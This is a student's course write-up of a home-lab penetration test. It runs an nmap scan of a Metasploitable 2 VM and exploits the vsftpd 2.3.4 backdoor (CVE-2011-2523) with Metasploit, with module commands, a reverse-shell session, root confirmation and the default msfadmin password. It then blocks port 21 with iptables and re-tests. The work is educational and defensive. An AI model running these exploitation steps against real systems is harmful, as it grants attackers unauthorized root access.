# Homelab

# 🔐 CMPT416 Cybersecurity Home Lab — Penetration Test Writeup

> **Course:** CMPT416 – Introduction to Cybersecurity  
> **Professor:** Dominick Foti  
> **Date:** May 15, 2026  
> **Author:** Mac Lama 
> **Target:** Metasploitable 2 (`192.168.159.131`)  
> **Attacker:** Kali Linux (`192.168.159.129`)

---

## 📋 Table of Contents

1. [Lab Environment](#-lab-environment)
2. [Network Diagram](#-network-diagram)
3. [Reconnaissance — nmap Scan](#-reconnaissance--nmap-scan)
4. [Vulnerability Analysis](#-vulnerability-analysis)
5. [Exploitation Walkthrough](#-exploitation-walkthrough)
6. [Defense & Remediation](#-defense--remediation)
7. [Verification — Exploit Confirmation Failed](#-verification--exploit-confirmation-failed)
8. [Conclusion](#-conclusion)
9. [References](#-references)

---

## 🖥️ Lab Environment

The home lab was built using **VMware Workstation Pro** with three virtual machines connected via a VMnet1 host-only network (`192.168.159.0/24`). Kali Linux has a secondary NAT adapter for internet access, while the other two VMs are fully isolated from the internet.

| VM | Role | IP Address | Network |
|---|---|---|---|
| Kali Linux | Attack box | `192.168.159.129` | NAT + Host-only (VMnet1) |
| Metasploitable 2 | Target / defense box | `192.168.159.131` | Host-only (VMnet1) only |
| Services VM | Additional services | `192.168.159.132` | Host-only (VMnet1) only |

> **Note:** After encountering persistent networking and compatibility issues with Metasploitable 3, I switched to Metasploitable 2 (professor's recommendation). 

### Additional Services (Objective 4)

The Services VM hosts two additional services:

- 🤖 **Ollama** — a locally hosted AI agent running the `llama3.2:1b` language model
- 📧 **Modoboa** — a full-featured open-source email server with a web interface, accessible via browser at `http://mail.mail-services-vm.local`

\---

## 🗺️ Network Diagram

![Network Diagram](https://github.com/user-attachments/assets/c286522d-1725-44ae-ad62-2e41c807568a)

*All VMs sit on VMnet1 (192.168.159.0/24). Only Kali has outbound internet access via NAT.*

**Connectivity verified via ping:**

```
# From Kali → Metasploitable 2
ping -c 4 192.168.159.131

# From Metasploitable 2 → Services VM
ping -c 4 192.168.159.132
```

![Kali Ping](https://github.com/user-attachments/assets/89e6ee6b-25a9-4504-a593-4e3546496c86)
![Metasploitable Ping](https://github.com/user-attachments/assets/94df04f8-ed61-48f9-a549-513caf1d8dc9)

---

## 🔍 Reconnaissance — nmap Scan

The first step in any penetration test is reconnaissance. Using **[nmap](https://nmap.org/docs.html)** from Kali Linux, an active discovery scan was run against the target to identify open ports, running services, and the operating system.

### Command

```bash
sudo nmap -sV -O 192.168.159.131
```

| Flag | Purpose |
|---|---|
| `-sV` | Service & version detection |
| `-O` | OS fingerprinting |

### Results

```
Starting Nmap 7.98 at 2026-05-14 17:10 -0400
Nmap scan report for 192.168.159.131
Host is up (0.00097s latency).

PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.3.4        ← ⚠️ VULNERABILITY
22/tcp   open   ssh         OpenSSH 4.7p1
23/tcp   open   telnet      Linux telnetd
25/tcp   open   smtp        Postfix smtpd
53/tcp   open   domain      ISC BIND 9.4.2
80/tcp   open   http        Apache httpd 2.2.8
139/tcp  open   netbios-ssn Samba smbd 3.X-4.X
445/tcp  open   netbios-ssn Samba smbd 3.X-4.X
3306/tcp open   mysql       MySQL 5.0.51a
5432/tcp open   postgresql  PostgreSQL 8.3.0-8.3.7
5900/tcp open   vnc         VNC (protocol 3.3)
6667/tcp open   irc         UnrealIRCd
8180/tcp open   http        Apache Tomcat/Coyote JSP

OS details: Linux 2.6.9 - 2.6.33
```

![nmap scan](https://github.com/user-attachments/assets/f61d8c7f-e642-400d-bcdb-91ba5a87ad790)


The scan immediately flagged **vsftpd 2.3.4** on port 21, which has a critical supply-chain backdoor.

---

## 🐛 Vulnerability Analysis

| Field | Details |
|---|---|
| **Vulnerability** | vsftpd 2.3.4 Backdoor |
| **CVE** | [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) |
| **CVSS Score** | 10.0 — Critical |
| **CWE** | CWE-78 — OS Command Injection |
| **Affected Software** | vsftpd 2.3.4 |
| **Disclosure Date** | July 3, 2011 |
| **Port** | 21/tcp (FTP) |

### Description

A malicious backdoor was secretly injected into the vsftpd 2.3.4 source archive between **June 30th and July 1st, 2011**, before being discovered and removed on July 3rd, 2011. Any organization that downloaded and deployed vsftpd during this window was silently compromised through their own software supply chain.

When a user appends a `:)` smiley face to their FTP username during login, the backdoor triggers and **opens a root shell on port 6200** — granting full, unauthenticated system access.

### Real-World Impact

If this vulnerability were exploited in a production environment, an attacker with root access could:

- 🗃️ Steal or permanently destroy all data on the server
- 🦠 Install persistent malware, ransomware, or a rootkit
- 🔀 Pivot laterally to other machines on the internal network
- 👤 Create hidden backdoor accounts for future re-entry
- 🕵️ Operate completely undetected without forensic investigation

This is a **supply chain attack**  where the malicious code was embedded in the official download, meaning victims had no way to protect themselves through normal patching practices.

---

## 💥 Exploitation Walkthrough

With the vulnerability confirmed, the **[Metasploit Framework](https://docs.metasploit.com/)** was used to exploit it from Kali Linux.

### Step 1 — Launch Metasploit

```bash
sudo msfconsole
```

### Step 2 — Load the Exploit Module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

| Field | Value |
|---|---|
| **Module** | `exploit/unix/ftp/vsftpd_234_backdoor` |
| **Reference** | [Exploit-DB #49757](https://www.exploit-db.com/exploits/49757) |
| **Rapid7 Source** | [Rapid7 Module](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/) |

### Step 3 — Set Options

```bash
set RHOSTS 192.168.159.131   # Target IP (Metasploitable 2)
set LHOST 192.168.159.129    # Attacker IP (Kali Linux)
# RPORT defaults to 21 (FTP)
```

### Step 4 — Run the Exploit

```bash
run
```

**Output:**
```
[*] Started reverse TCP handler on 192.168.159.129:4444
[+] 192.168.159.131:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.159.129:4444 → 192.168.159.131:522)
```

![exploitation](https://github.com/user-attachments/assets/840736b7-108d-4c1e-97de-f210648f59ae)




### Step 5 — Confirm Root Access

```bash
shell
id
```

**Result:**
```
uid=0(root) gid=0(root)
```

![Root Access](https://github.com/user-attachments/assets/8c840b47-d8a9-4566-8a68-9d26a4f29c45)

| Field | Value |
|---|---|
| **Payload delivered** | Reverse TCP shell via Meterpreter |
| **Access level** | Full root (`uid=0`, `gid=0`) |

---

## 🛡️ Defense & Remediation

Once exploitation was confirmed, the vulnerability was patched using **[iptables](https://linux.die.net/man/8/iptables)** firewall rules to block all traffic on port 21.

> Since vsftpd 2.3.4 on Metasploitable 2 is compiled into the system rather than installed as a removable package, blocking the port at the firewall level is the most reliable remediation approach in this environment.

### Step 1 — SSH into Metasploitable 2 from Kali

```bash
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=+ssh-rsa \
    msfadmin@192.168.159.131
```

*Password: `msfadmin`*

### Step 2 — Apply Firewall Rules

```bash
sudo iptables -A INPUT -p tcp --dport 21 -j DROP
sudo iptables -A OUTPUT -p tcp --sport 21 -j DROP
```

### How It Works

| Rule | Effect |
|---|---|
| `INPUT --dport 21 -j DROP` | Drops all incoming TCP connections to port 21 |
| `OUTPUT --sport 21 -j DROP` | Drops all outgoing responses from port 21 |

Together, these rules make port 21 completely unreachable. No client can initiate a connection, and even if a packet slips through, the server won't respond.

### Environmental Impact

Blocking port 21 disables FTP access to the machine entirely. In a production environment, this trade-off would need to be evaluated against any legitimate FTP use cases. The proper long-term fix is to upgrade vsftpd to a clean version released after July 3rd, 2011. In this lab context, the firewall rule is a fast, effective, and demonstrable remediation.

---

## ✅ Verification — Exploit Confirmation Failed

To prove the patch worked, the **exact same exploit** was run again from Kali after the firewall rules were applied:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.159.131
set LHOST 192.168.159.129
run
```

**Result:**
```
[-] 192.168.159.131:21 - Exploit failed [unreachable]: Rex::ConnectionTimeout
    The connection with (192.168.159.131:21) timed out.
[*] Exploit completed, but no session was created.
```

![Defense](https://github.com/user-attachments/assets/8c0f08cf-3003-4186-9089-2d06d3f0b9ee)

The connection timed out and no session was created. **The patch was successful.**

---

## 📝 Conclusion

This penetration test demonstrated the full lifecycle of a security engagement:

1. 🔍 **Reconnaissance** — nmap identified vsftpd 2.3.4 on port 21
2. 🐛 **Vulnerability Analysis** — CVE-2011-2523 confirmed as exploitable
3. 💥 **Exploitation** — Root access achieved via Metasploit in seconds
4. 🛡️ **Remediation** — iptables rules blocked port 21
5. ✅ **Verification** — Exploit confirmed non-functional after patching

The vsftpd 2.3.4 backdoor is one of many examples of the dangers of supply chain attacks. A single compromised download can grant root access to any attacker who reaches the affected port. This exercise also highlights core security principles: **keep software updated**, **monitor open ports**, and **expose only what is necessary**.

---

## 📚 References

1. [CVE-2011-2523 — National Vulnerability Database (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
2. [Rapid7 — vsftpd_234_backdoor Metasploit Module](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
3. [CVE Details — CVE-2011-2523](https://www.cvedetails.com/cve/CVE-2011-2523/)
4. [Nmap Documentation](https://nmap.org/docs.html)
5. [Nmap ftp-vsftpd-backdoor NSE Script](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)
6. [Metasploit Framework Documentation](https://docs.metasploit.com/)
7. [iptables Manual — linux.die.net](https://linux.die.net/man/8/iptables)

---

*Report written as part of CMPT416 Introduction to Cybersecurity — Professor Dominick Foti*
